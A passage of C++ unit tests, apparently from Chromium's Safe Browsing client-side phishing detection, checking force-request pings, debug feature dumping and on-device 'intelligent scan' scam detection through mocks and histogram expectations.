      "AsyncCheckTriggerForceRequestResult",
      ClientSideDetectionHost::AsyncCheckTriggerForceRequestResult::
          kSkippedNotForced,
      1);
}

TEST_F(ClientSideDetectionRTLookupResponseForceRequestTest,
       AsyncCheckTrackerTriggersClassificationRequestOnLocalModelPhishing) {
  NavigateAndCommit(example_url_);

  ClientPhishingRequest verdict;
  verdict.set_url(example_url_.spec());
  verdict.set_client_score(1.0f);
  verdict.set_is_phishing(true);
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));

  // Check that the page is phishing and triggers a ping.
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.LocalModelDetectsPhishing", true, 1);
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.LocalModelDetectsPhishing.TriggerModel", true, 1);

  SetRTResponseInCacheManager(/*is_enforced=*/true);

  // Calling this should trigger preclassification again, because local model
  // phishy verdict is not a condition to skip the async check force request
  // because the force request ping will contain information that the page load
  // request may have missed.
  base::RunLoop run_loop;
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
      .Times(1)
      .WillOnce(
          [&](std::unique_ptr<ClientPhishingRequest>,
              ClientSideDetectionService::ClientReportPhishingRequestCallback,
              const std::string&) { run_loop.Quit(); });
  CompleteAsyncCheck();
  run_loop.Run();

  // Token is now fetched, so we will now callback on
  // ClientReportPhishingRequest.
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

  // Enforce request should be triggered again, because the local model will
  // think it's phishy, but force request pings can contain other information,
  // such as the LLM information.
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 1);
  histogram_tester_.ExpectUniqueSample(
      "SBClientPhishing.ClientSideDetection."
      "AsyncCheckTriggerForceRequestResult",
      ClientSideDetectionHost::AsyncCheckTriggerForceRequestResult::kTriggered,
      1);
}

TEST_F(
    ClientSideDetectionRTLookupResponseForceRequestTest,
    AsyncCheckTrackerNotTriggerClassificationRequestOnTriggerModelPingConvertedToForceRequest) {
  NavigateAndCommit(example_url_);

  // Setup RTResponse in cache prior to calling PhishingDetectionDone.
  SetRTResponseInCacheManager(/*is_enforced=*/true);

  ClientPhishingRequest verdict;
  verdict.set_url(example_url_.spec());
  verdict.set_client_score(0.5f);
  verdict.set_is_phishing(false);
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
  task_environment()->RunUntilIdle();

  // Check that the page is phishing and triggers a ping.
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 1);
  histogram_tester_.ExpectBucketCount("SBClientPhishing.RTLookupForceRequest",
                                      true, 1);

  CompleteAsyncCheck();
  task_environment()->RunUntilIdle();

  // Enforce request should NOT be triggered again, because the page load ping
  // has been converted to a force request ping.
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 1);
  histogram_tester_.ExpectUniqueSample(
      "SBClientPhishing.ClientSideDetection."
      "AsyncCheckTriggerForceRequestResult",
      ClientSideDetectionHost::AsyncCheckTriggerForceRequestResult::
          kSkippedTriggerModelsPingSentAsForceRequest,
      1);
}

class ClientSideDetectionHostNewObserversForceRequestTest
    : public ClientSideDetectionRTLookupResponseForceRequestTest {
 public:
  ClientSideDetectionHostNewObserversForceRequestTest() {
    feature_list_.InitAndEnableFeature(kClientSideDetectionNewObservers);
  }

  void SetUp() override {
    ClientSideDetectionRTLookupResponseForceRequestTest::SetUp();
  }
};

TEST_F(ClientSideDetectionHostNewObserversForceRequestTest,
       TestTriggerModelsConvertedToForceRequestAtLoad) {
  // Expectations for classifications. Using AtLeast(1) inside
  // ExpectPreClassificationChecks is not easy, so we'll just call it once
  // and hope for the best, or use our own expectations if needed.
  // Actually, let's use our own with AnyNumber() to be safe against
  // multiple paint triggers.
  EXPECT_CALL(*csd_service_, IsPrivateIPAddress(_))
      .Times(testing::AnyNumber())
      .WillRepeatedly(Return(false));
  EXPECT_CALL(*database_manager_.get(), CheckCsdAllowlistUrl(_, _))
      .Times(testing::AnyNumber())
      .WillRepeatedly(Return(AsyncMatch::NO_MATCH));
  EXPECT_CALL(*database_manager_.get(), CanCheckUrl(_))
      .Times(testing::AnyNumber())
      .WillRepeatedly(Return(true));
  EXPECT_CALL(*csd_service_, AtPhishingReportLimit())
      .Times(testing::AnyNumber())
      .WillRepeatedly(Return(false));

  // Now navigate, but don't call the new observers yet.
  controller().LoadURL(example_url_, content::Referrer(),
                       ui::PAGE_TRANSITION_LINK, std::string());
  content::WebContentsTester::For(web_contents())->CommitPendingNavigation();
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.TriggerModelsConvertedToForceRequestAtLoad", 0);

  SetRTResponseInCacheManager(true);

  // Generally, this never happens unless a sampled RTLookupResponse contains
  // the suspicious URL. For the purpose of this test, we will set that there's
  // a match.
  SetHighConfidenceAllowlistAcceptanceRate(1.0f);
  database_manager_->SetAllowlistLookupDetailsForUrl(example_url_, true);

  // We will send a ping because the async check has completed and forced
  // request is set.
  base::RunLoop run_loop;
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
      .Times(1)
      .WillOnce(
          [&](std::unique_ptr<ClientPhishingRequest>,
              ClientSideDetectionService::ClientReportPhishingRequestCallback,
              const std::string&) { run_loop.Quit(); });
  // This should trigger OnAsyncSafeBrowsingCheckCompleted, which should
  // trigger FORCE_REQUEST classification because the flag is set.
  CompleteAsyncCheck();
  run_loop.Run();

  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 1);

  NotifyClientSideDetectionObservers();

  histogram_tester_.ExpectUniqueSample(
      "SBClientPhishing.TriggerModelsConvertedToForceRequestAtLoad", true, 1);

  GURL different_url("http://different_url.com/");

  // Although it won't be allowlisted, we will set it for the sake of this test.
  database_manager_->SetAllowlistLookupDetailsForUrl(different_url, true);

  // Make sure navigating to a different, fresh URL will not convert to a force
  // request trigger.
  NavigateAndCommit(different_url);
  histogram_tester_.ExpectUniqueSample(
      "SBClientPhishing.TriggerModelsConvertedToForceRequestAtLoad", true, 1);
}

TEST_F(ClientSideDetectionHostNewObserversForceRequestTest,
       TestTriggerModelsConvertedToForceRequestAtRequest) {
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
  SetRTResponseInCacheManager(/*is_enforced=*/true);
  // Generally, this never happens unless a sampled RTLookupResponse contains
  // the suspicious URL. For the purpose of this test, we will set that there's
  // a match.
  SetHighConfidenceAllowlistAcceptanceRate(1.0f);
  database_manager_->SetAllowlistLookupDetailsForUrl(example_url_, true);

  EXPECT_CALL(*csd_service_, IsPrivateIPAddress(_))
      .Times(testing::AnyNumber())
      .WillRepeatedly(Return(false));
  EXPECT_CALL(*database_manager_.get(), CheckCsdAllowlistUrl(_, _))
      .Times(testing::AnyNumber())
      .WillRepeatedly(Return(AsyncMatch::NO_MATCH));
  EXPECT_CALL(*database_manager_.get(), CanCheckUrl(_))
      .Times(testing::AnyNumber())
      .WillRepeatedly(Return(true));
  EXPECT_CALL(*csd_service_, AtPhishingReportLimit())
      .Times(testing::AnyNumber())
      .WillRepeatedly(Return(false));

  // Navigate and trigger initial classification as TRIGGER_MODELS.
  NavigateAndCommit(example_url_);

  // Now async check completes. This triggers another classification as
  // FORCE_REQUEST.
  CompleteAsyncCheck();

  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetection."
      "AsyncCheckTriggerForceRequestResult",
      ClientSideDetectionHost::AsyncCheckTriggerForceRequestResult::kTriggered,
      1);

  // Now simulate PhishingDetectionDone being called with TRIGGER_MODELS.
  // This simulates a verdict coming back for the ORIGINAL request.
  ClientPhishingRequest verdict;
  verdict.set_url(example_url_.spec());
  verdict.set_client_side_detection_type(
      ClientSideDetectionType::TRIGGER_MODELS);
  verdict.set_client_score(0.8f);
  verdict.set_is_phishing(true);

  // PhishingDetectionDone will call MaybeSendClientPhishingRequest.
  // We expect it to be sent as FORCE_REQUEST to the service.
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
      .WillOnce(base::test::RunOnceClosure(base::DoNothing()));

  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict),
                        ClientSideDetectionType::TRIGGER_MODELS);

  histogram_tester_.ExpectUniqueSample(
      "SBClientPhishing.TriggerModelsConvertedToForceRequestAtRequest", true,
      1);
}

class ClientSideDetectionHostDebugFeaturesTest
    : public ClientSideDetectionHostTest {
 public:
  ClientSideDetectionHostDebugFeaturesTest() = default;

  void SetUp() override {
    ASSERT_TRUE(temp_dir_.CreateUniqueTempDir());
    command_line_.GetProcessCommandLine()->AppendSwitchPath(
        "--csd-debug-feature-directory", temp_dir_.GetPath());

    ClientSideDetectionHostTest::SetUp();
  }

 private:
  base::ScopedTempDir temp_dir_;
  base::test::ScopedCommandLine command_line_;
};

TEST_F(ClientSideDetectionHostDebugFeaturesTest,
       SkipsAllowlistWhenDumpingFeatures) {
  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, nullptr, nullptr, nullptr);
  EXPECT_CALL(*database_manager_.get(), CheckCsdAllowlistUrl(url, _)).Times(0);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();
  fake_phishing_detector_.CheckMessage(&url);
}

TEST_F(ClientSideDetectionHostDebugFeaturesTest,
       SkipsCacheWhenDumpingFeatures) {
  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, nullptr, nullptr, nullptr);
  EXPECT_CALL(*csd_service_, GetValidCachedResult(url, NotNull())).Times(0);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();
  fake_phishing_detector_.CheckMessage(&url);
}

TEST_F(ClientSideDetectionHostDebugFeaturesTest,
       SkipsReportLimitWhenDumpingFeatures) {
  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, nullptr, nullptr, nullptr);
  EXPECT_CALL(*csd_service_, AtPhishingReportLimit()).Times(0);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();
  fake_phishing_detector_.CheckMessage(&url);
}

class ClientSideDetectionHostScamDetectionTest
    : public ClientSideDetectionHostTest {
 public:
  ClientSideDetectionHostScamDetectionTest() = default;

  void SetUp() override {
    ClientSideDetectionHostTest::SetUp();
    SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
    database_manager_->SetAllowlistLookupDetailsForUrl(example_url_, false);

    ON_CALL(*raw_token_fetcher_, Start(_))
        .WillByDefault([&](SafeBrowsingTokenFetcher::Callback callback) {
          std::move(callback).Run("fake_access_token");
        });
    ON_CALL(*intelligent_scan_delegate_, ShouldRequestIntelligentScan(_))
        .WillByDefault(Return(true));
    ON_CALL(*intelligent_scan_delegate_, GetIntelligentScanModelType(_))
        .WillByDefault(Return(IntelligentScanDelegate::ModelType::kOnDevice));
    NavigateAndCommit(example_url_);
  }

  void CacheForcedTriggerInfo(bool has_llama_forced_trigger_info,
                              bool intelligent_scan,
                              const std::string& cache_expression) {
    VerdictCacheManager* cache_manager =
        VerdictCacheManagerFactory::GetForProfile(
            Profile::FromBrowserContext(web_contents()->GetBrowserContext()));

    RTLookupResponse response;

    RTLookupResponse::ThreatInfo* new_threat_info2 = response.add_threat_info();
    new_threat_info2->set_verdict_type(RTLookupResponse::ThreatInfo::DANGEROUS);
    new_threat_info2->set_threat_type(
        RTLookupResponse::ThreatInfo::SOCIAL_ENGINEERING);
    new_threat_info2->set_cache_duration_sec(60);
    new_threat_info2->set_cache_expression_using_match_type(cache_expression);
    new_threat_info2->set_cache_expression_match_type(
        RTLookupResponse::ThreatInfo::EXACT_MATCH);

    response.set_client_side_detection_type(
        safe_browsing::ClientSideDetectionType::FORCE_REQUEST);

    if (has_llama_forced_trigger_info) {
      safe_browsing::LlamaForcedTriggerInfo llama_forced_trigger_info;
      safe_browsing::LlamaTriggerRuleInfo* llama_trigger_rule_info =
          llama_forced_trigger_info.add_llama_trigger_rule_infos();
      llama_trigger_rule_info->set_llama_trigger_rule_id(28);
      llama_trigger_rule_info->set_intelligent_scan(intelligent_scan);
      llama_forced_trigger_info.set_trigger_url(cache_expression);
      llama_forced_trigger_info.set_intelligent_scan(intelligent_scan);
      response.mutable_llama_forced_trigger_info()->Swap(
          &llama_forced_trigger_info);
    }

    cache_manager->CacheRealTimeUrlVerdict(response, base::Time::Now());
    EXPECT_EQ(
        static_cast<int>(safe_browsing::ClientSideDetectionType::FORCE_REQUEST),
        cache_manager->GetCachedRealTimeUrlClientSideDetectionType(
            example_url_));
    if (has_llama_forced_trigger_info) {
      safe_browsing::LlamaForcedTriggerInfo cache_llama_forced_trigger_info;
      EXPECT_TRUE(cache_manager->GetCachedRealTimeLlamaForcedTriggerInfo(
          example_url_, &cache_llama_forced_trigger_info));
      // Because llama_forced_trigger_info is not copied, but rather passed by
      // reference, we explicitly check with direct values set to the object
      // above.
      EXPECT_EQ(cache_llama_forced_trigger_info.intelligent_scan(),
                intelligent_scan);
      EXPECT_EQ(static_cast<int>(
                    cache_llama_forced_trigger_info.llama_trigger_rule_infos()
                        .size()),
                1);
      EXPECT_EQ(cache_llama_forced_trigger_info.llama_trigger_rule_infos()
                    .at(0)
                    .llama_trigger_rule_id(),
                28);
      EXPECT_EQ(cache_llama_forced_trigger_info.llama_trigger_rule_infos()
                    .at(0)
                    .intelligent_scan(),
                intelligent_scan);
    }
  }

  void SetIntelligentScanCallback(bool should_return_response) {
    EXPECT_CALL(*intelligent_scan_delegate_, StartIntelligentScan(_, _))
        .WillOnce(
            [=, this](
                std::string rendered_text,
                IntelligentScanDelegate::IntelligentScanDoneCallback callback) {
              base::UnguessableToken token = base::UnguessableToken::Create();
              IntelligentScanDelegate::IntelligentScanResult
                  scam_detection_response;
              scam_detection_response.model_type =
                  IntelligentScanDelegate::ModelType::kOnDevice;
              if (!should_return_response) {
                scam_detection_response.execution_success = false;
                scam_detection_response.model_version = -1;
                scam_detection_response.no_info_reason =
                    IntelligentScanInfo::ON_DEVICE_MODEL_OUTPUT_MISSING;
                std::move(callback).Run(scam_detection_response);
                return token;
              }
              scam_detection_response.execution_success = true;
              scam_detection_response.model_version = example_model_version_;
              scam_detection_response.brand = example_brand_;
              scam_detection_response.intent = example_intent_;
              std::move(callback).Run(scam_detection_response);
              return token;
            });
  }

  void SetSendClientReportPhishingRequestCallback(
      bool has_expected_brand_and_intent,
      std::optional<IntelligentScanInfo::NoInfoReason> expected_no_info_reason,
      std::optional<std::string> expected_llama_forced_trigger_info_trigger_url,
      bool returned_is_phishing,
      IntelligentScanVerdict returned_intelligent_scan_verdict) {
    EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
        .Times(1)
        .WillOnce([=, this](std::unique_ptr<ClientPhishingRequest> request,
                            ClientSideDetectionService::
                                ClientReportPhishingRequestCallback callback,
                            const std::string&) {
          if (has_expected_brand_and_intent) {
            EXPECT_EQ(request->intelligent_scan_info().brand(), example_brand_);
            EXPECT_EQ(request->intelligent_scan_info().intent(),
                      example_intent_);
            EXPECT_EQ(request->intelligent_scan_info().model_version(),
                      example_model_version_);
            EXPECT_EQ(request->intelligent_scan_info().model_type(),
                      IntelligentScanModelType::ON_DEVICE_MODEL);
          } else {
            EXPECT_FALSE(request->intelligent_scan_info().has_brand());
            EXPECT_FALSE(request->intelligent_scan_info().has_intent());
          }
          if (expected_no_info_reason.has_value()) {
            EXPECT_EQ(request->intelligent_scan_info().no_info_reason(),
                      expected_no_info_reason.value());
          } else {
            EXPECT_FALSE(request->intelligent_scan_info().has_no_info_reason());
          }
          if (expected_llama_forced_trigger_info_trigger_url.has_value()) {
            EXPECT_EQ(request->llama_forced_trigger_info().trigger_url(),
                      expected_llama_forced_trigger_info_trigger_url.value());
          } else {
            EXPECT_FALSE(
                request->llama_forced_trigger_info().has_trigger_url());
          }
          std::move(callback).Run(example_url_, returned_is_phishing,
                                  net::HTTP_OK,
                                  returned_intelligent_scan_verdict);
        });
  }

  void VerifyExpectedCalls() {
    EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
    EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));
    EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));
  }

  void VerifyGeneralScamDetectionHistograms(
      ClientSideDetectionType expected_request_type,
      std::optional<bool> is_intelligent_scan_available,
      std::optional<bool> model_has_successful_response,
      std::optional<IntelligentScanVerdict> intelligent_scan_verdict) {
    histogram_tester_.ExpectBucketCount(
        "SBClientPhishing.ClientSideDetectionTypeRequest",
        expected_request_type, 1);
    if (is_intelligent_scan_available) {
      histogram_tester_.ExpectUniqueSample(
          "SBClientPhishing.IsIntelligentScanAvailableAtInquiryTime",
          is_intelligent_scan_available.value(), 1);
      histogram_tester_.ExpectUniqueSample(
          "SBClientPhishing.IsIntelligentScanAvailableAtInquiryTime." +
              GetRequestTypeName(expected_request_type),
          is_intelligent_scan_available.value(), 1);
    } else {
      histogram_tester_.ExpectTotalCount(
          "SBClientPhishing.IsIntelligentScanAvailableAtInquiryTime", 0);
      histogram_tester_.ExpectTotalCount(
          "SBClientPhishing.IsIntelligentScanAvailableAtInquiryTime." +
              GetRequestTypeName(expected_request_type),
          0);
    }
    if (model_has_successful_response.has_value()) {
      histogram_tester_.ExpectUniqueSample(
          "SBClientPhishing.IntelligentScanHasSuccessfulResponse." +
              GetRequestTypeName(expected_request_type),
          model_has_successful_response.value(), 1);
    } else {
      histogram_tester_.ExpectTotalCount(
          "SBClientPhishing.IntelligentScanHasSuccessfulResponse." +
              GetRequestTypeName(expected_request_type),
          0);
    }
    if (intelligent_scan_verdict.has_value()) {
      histogram_tester_.ExpectUniqueSample(
          "SBClientPhishing.IntelligentScanVerdict",
          intelligent_scan_verdict.value(), 1);
    } else {
      histogram_tester_.ExpectTotalCount(
          "SBClientPhishing.IntelligentScanVerdict", 0);
    }
  }

  void VerifyForcedTriggerScamDetectionHistograms(
      bool force_request,
      bool has_llama_forced_trigger_info,
      bool intelligent_scan,
      std::optional<bool> redirect_chain_contains_llama_forced_trigger_info) {
    histogram_tester_.ExpectBucketCount("SBClientPhishing.RTLookupForceRequest",
                                        force_request, 1);
    histogram_tester_.ExpectBucketCount(
        "SBClientPhishing.RTLookupForceRequest.HasLlamaForcedTriggerInfo",
        has_llama_forced_trigger_info, 1);
    if (redirect_chain_contains_llama_forced_trigger_info.has_value()) {
      histogram_tester_.ExpectBucketCount(
          "SBClientPhishing.RedirectChainContainsForcedTriggerInfo",
          *redirect_chain_contains_llama_forced_trigger_info, 1);
    }

    if (has_llama_forced_trigger_info) {
      histogram_tester_.ExpectBucketCount(
          "SBClientPhishing.LlamaForcedTriggerInfo.IntelligentScan",
          intelligent_scan, 1);
      histogram_tester_.ExpectBucketCount(
          "SBClientPhishing.LlamaForcedTriggerInfo.LlamaTriggerRuleInfosSize",
          1, 1);
      histogram_tester_.ExpectBucketCount(
          "SBClientPhishing.LlamaForcedTriggerInfo.LlamaTriggerRuleId", 28, 1);
    }
  }

  void PhishingDetectionDone(bool is_phishing,
                             float client_score,
                             ClientSideDetectionType type,
                             bool did_match_high_confidence_allowlist) {
    ClientPhishingRequest verdict;
    verdict.set_url(example_url_.spec());
    verdict.set_client_score(client_score);
    verdict.set_is_phishing(is_phishing);
    csd_host_->PhishingDetectionDone(type,
                                     /*is_sample_ping=*/false,
                                     did_match_high_confidence_allowlist,
                                     /*is_invalid_ip=*/false, clock_.NowTicks(),
                                     mojom::PhishingDetectorResult::SUCCESS,
                                     mojo_base::ProtoWrapper(verdict));
  }

  void SetExampleUrl(GURL example_url) { example_url_ = example_url; }

  base::HistogramTester histogram_tester_;
  GURL example_url_{"http://suspiciousurl.com/"};
  std::string example_brand_ = "Example Brand";
  std::string example_intent_ = "Example Intent";
  int example_model_version_ = 123;
};

TEST_F(ClientSideDetectionHostScamDetectionTest,
       IntelligentScanDisabledByDelegate) {
  EXPECT_CALL(*intelligent_scan_delegate_, ShouldRequestIntelligentScan(_))
      .WillOnce(Return(false));
  // Because the delegate has disabled intelligent scan, we will
  // NOT start the intelligent scan.
  EXPECT_CALL(*intelligent_scan_delegate_, StartIntelligentScan(_, _)).Times(0);
  EXPECT_CALL(*intelligent_scan_delegate_, OnScamWarningShown()).Times(0);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/false,
      /*expected_no_info_reason=*/std::nullopt,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.0f,
                        ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::
          KEYBOARD_LOCK_REQUESTED,
      /*is_intelligent_scan_available=*/std::nullopt,
      /*model_has_successful_response=*/std::nullopt,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);
  EXPECT_TRUE(Mock::VerifyAndClear(intelligent_scan_delegate_.get()));
}

TEST_F(ClientSideDetectionHostScamDetectionTest,
       IntelligentScanWithEmptyResponse) {
  SetIntelligentScanCallback(/*should_return_response=*/false);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/false,
      /*expected_no_info_reason=*/
      IntelligentScanInfo::ON_DEVICE_MODEL_OUTPUT_MISSING,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.0f,
                        ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::
          KEYBOARD_LOCK_REQUESTED,
      /*is_intelligent_scan_available=*/true,
      /*model_has_successful_response=*/false,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);
}

TEST_F(ClientSideDetectionHostScamDetectionTest,
       IntelligentScanWithFullResponse) {
  SetIntelligentScanCallback(/*should_return_response=*/true);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/true,
      /*expected_no_info_reason=*/std::nullopt,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  EXPECT_CALL(*intelligent_scan_delegate_, OnScamWarningShown()).Times(0);

  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.0f,
                        ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::
          KEYBOARD_LOCK_REQUESTED,
      /*is_intelligent_scan_available=*/true,
      /*model_has_successful_response=*/true,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);
  EXPECT_TRUE(Mock::VerifyAndClear(intelligent_scan_delegate_.get()));
}

TEST_F(ClientSideDetectionHostScamDetectionTest,
       EmptyInnerTextDoesNotTriggersIntelligentScan) {
  raw_delegate_->ForceEmptyInnerText();
  // Because the inner text is empty, we will NOT start the intelligent scan.
  EXPECT_CALL(*intelligent_scan_delegate_, StartIntelligentScan(_, _)).Times(0);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/false,
      /*expected_no_info_reason=*/IntelligentScanInfo::EMPTY_TEXT,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.0f,
                        ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::
          KEYBOARD_LOCK_REQUESTED,
      /*is_intelligent_scan_available=*/true,
      /*model_has_successful_response=*/std::nullopt,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);
}

TEST_F(ClientSideDetectionHostScamDetectionTest,
       ShortInnerTextDoesNotTriggersIntelligentScan) {
  // The current inner text is too short. Threshold is set at
  // ClientSideDetectionHost::kInnerTextMinThresholdBytes.
  raw_delegate_->SetInnerText("text");
  // Because the inner text is too short, we will NOT start the intelligent
  // scan.
  EXPECT_CALL(*intelligent_scan_delegate_, StartIntelligentScan(_, _)).Times(0);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/false,
      /*expected_no_info_reason=*/IntelligentScanInfo::TEXT_TOO_SHORT,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.0f,
                        ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::
          KEYBOARD_LOCK_REQUESTED,
      /*is_intelligent_scan_available=*/true,
      /*model_has_successful_response=*/std::nullopt,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);
}

TEST_F(ClientSideDetectionHostScamDetectionTest,
       AllowlistedOnHCDoesNotTriggersIntelligentScan) {
  // Because the URL is on the HC allowlist, we will NOT start the intelligent
  // scan.
  EXPECT_CALL(*intelligent_scan_delegate_, StartIntelligentScan(_, _)).Times(0);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/false,
      /*expected_no_info_reason=*/IntelligentScanInfo::ALLOWLISTED,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.0f,
                        ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED,
                        /*did_match_high_confidence_allowlist=*/true);

  VerifyExpectedCalls();
  // Allowlisted page does not check whether intelligent scan is available,
  // because it exists through the allowlist check beforehand.
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::
          KEYBOARD_LOCK_REQUESTED,
      /*is_intelligent_scan_available=*/std::nullopt,
      /*model_has_successful_response=*/std::nullopt,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);
}

TEST_F(ClientSideDetectionHostScamDetectionTest,
       NoIntelligentScanDoesNotTriggersIntelligentScan) {
  EXPECT_CALL(*intelligent_scan_delegate_, GetIntelligentScanModelType(_))
      .WillOnce(
          Return(IntelligentScanDelegate::ModelType::kNotSupportedOnDevice));
  // Because the intelligent scan is unavailable, we will NOT start the
  // intelligent scan.
  EXPECT_CALL(*intelligent_scan_delegate_, StartIntelligentScan(_, _)).Times(0);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/false,
      /*expected_no_info_reason=*/
      IntelligentScanInfo::ON_DEVICE_MODEL_UNAVAILABLE,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  PhishingDetectionDone(/*is_phishing=*/false, /*client_score=*/0.0f,
                        ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED,
                        /*did_match_high_confidence_allowlist=*/false);

  VerifyExpectedCalls();
  VerifyGeneralScamDetectionHistograms(
      /*expected_request_type=*/ClientSideDetectionType::
          KEYBOARD_LOCK_REQUESTED,
      /*is_intelligent_scan_available=*/false,
      /*model_has_successful_response=*/std::nullopt,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);
}

TEST_F(ClientSideDetectionHostScamDetectionTest,
       ScamExperimentVerdictOnClientPhishingResponseAndShowBlockingPage) {
  SetIntelligentScanCallback(/*should_return_response=*/true);
  SetSendClientReportPhishingRequestCallback(
      /*has_expected_brand_and_intent=*/true,
      /*expected_no_info_reason=*/std::nullopt,
      /*expected_llama_forced_trigger_info_trigger_url=*/std::nullopt,
      /*returned_is_phishing=*/false,
      /*returned_intelligent_scan_verdict=*/
